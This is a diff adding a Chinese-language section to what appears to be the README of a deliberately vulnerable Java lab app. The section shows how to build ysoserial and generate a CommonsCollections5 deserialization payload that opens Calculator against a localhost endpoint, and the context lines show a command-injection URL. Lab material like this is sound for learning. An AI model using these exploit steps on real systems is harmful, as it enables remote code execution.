@@ -58,3 +58,17 @@ http://localhost:8080/rce/exec?cmd=whoami
 ``` 
 Viarus
 ```
+
+## 说明
+
+### 反序列化
+
+利用ysoserial构造POC
+
+``` 
+git clone https://github.com/frohoff/ysoserial.git
+mvn clean package -DskipTests
+java -jar /Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'open /Applications/Calculator.app' > /tmp/poc
+```
+
+访问`http://localhost:8080/deserialize/test`即可弹窗
